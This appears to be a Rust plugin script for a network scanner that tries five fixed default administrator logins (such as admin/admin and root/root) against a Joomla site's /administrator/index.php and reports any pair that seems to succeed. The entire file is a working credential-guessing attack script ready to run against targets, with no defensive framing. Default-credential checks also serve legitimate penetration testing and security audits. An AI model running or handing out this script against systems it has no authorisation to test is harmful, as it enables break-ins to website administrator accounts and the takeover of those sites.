/* http-joomla-brute-2 - five fixed Joomla administrator logins */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let users = ["admin", "root", "admin", "root", "password"];
    let passes = ["admin", "root", "password", "password", "password"];
    let mut found = 0usize;
    for i in 0..5 {
        let body = format!("username={}&passwd={}&option=com_login&task=login",
                           users[i], passes[i]);
        let resp = match http_request(ctx, "POST", "/administrator/index.php", None,
                                      "\r\n", &body,
                                      Some("application/x-www-form-urlencoded"), 4096) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if http_status(&resp) != 401 && !contains_ci(&resp, "Invalid") {
            append_out(ctx, &format!("{}{}:{}",
                if found == 0 { "Joomla valid credentials: " } else { ", " },
                users[i], passes[i]));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "Joomla brute: no valid credentials in 5 attempts");
    }
    0
}
